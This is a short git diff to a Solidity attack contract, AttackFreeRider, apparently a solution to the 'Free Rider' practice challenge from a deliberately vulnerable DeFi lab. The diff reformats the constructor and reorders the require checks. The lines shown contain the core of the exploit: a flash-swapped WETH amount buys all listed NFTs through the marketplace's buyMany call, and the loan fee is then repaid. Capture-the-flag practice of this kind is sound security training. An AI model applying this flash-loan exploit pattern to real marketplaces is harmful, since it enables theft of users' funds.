@@ -98,7 +98,13 @@ contract AttackFreeRider is IERC721Receiver {
     address private immutable attacker;
     WETH9 private immutable weth;
     uint[] tokenIds = [0,1,2,3,4,5];
-    constructor(address _pair, address payable _marketplace, address _buyContract, address _nft, address payable _weth){
+    constructor(
+        address _pair,
+        address payable _marketplace,
+        address _buyContract,
+        address _nft,
+        address payable _weth
+    ) {
         pair = IUniswapV2Pair(_pair);
         marketplace = FreeRiderNFTMarketplace(_marketplace);
         buyContract = FreeRiderBuyer(_buyContract);
@@ -128,8 +134,8 @@ contract AttackFreeRider is IERC721Receiver {
         uint,
         bytes calldata
     ) external {
-        require(_sender == address(this), "Only this contract can execute the flashloan");
         require(msg.sender == address(pair), "Only WETH/DVT pair contract can call this function");
+        require(_sender == address(this), "Only this contract can execute the flashloan");
         weth.withdraw(_amount0);
         marketplace.buyMany{value: address(this).balance }(tokenIds);
         uint _fee = 1+((_amount0)*3)/997; // 1+ is there in case the integer division equals zero.
